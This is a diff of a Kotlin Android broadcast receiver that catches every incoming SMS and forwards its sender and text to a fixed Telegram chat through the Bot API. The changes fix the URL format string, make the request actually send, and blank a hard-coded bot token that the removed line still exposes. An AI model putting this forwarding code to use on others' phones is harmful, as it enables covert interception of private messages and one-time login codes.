@@ -25,8 +25,8 @@ class SmsBroadcastReceiver : BroadcastReceiver() {
 
         if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
             val sms = getSmsFromIntent(intent)
-            val urlStringFormat = "https://api.telegram.org/bot%build/sendMessage?chat_id=%build&text=%build"
-            val apiToken = "488699109:AAEKYpTzU6VNumJIAY_L9yEQZpZND7Da688"
+            val urlStringFormat = "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s"
+            val apiToken = ""
             val chatId = "59755972"
             var sender: String? = null
             var msg: StringBuilder? = null
@@ -83,15 +83,15 @@ class SmsBroadcastReceiver : BroadcastReceiver() {
 
     private fun sendMessageToTelegram(context: Context, urlString: String?) {
         val x : Payamak = Payamak()
-        val database = AppDatabase.getInMemoryDatabase(context.getApplication());
-        database.payamakDao().addPayamak(x)
+//        val database = AppDatabase.getInMemoryDatabase(context.getApplication());
+//        database.payamakDao().addPayamak(x)
 //        val database = AppDatabase.getDatabase(context);
 //        database.payamakDao().addPayamak(x)
         val thread = Thread(Runnable {
             try {
                 val url = URL(urlString)
                 val conn = url.openConnection()
-                conn.connect()
+                conn.content
             } catch (e: MalformedURLException) {
                 Log.e("SmsBroadcastReceiver", e.message)
                 Log.e("SmsBroadcastReceiver", Arrays.toString(e.stackTrace))
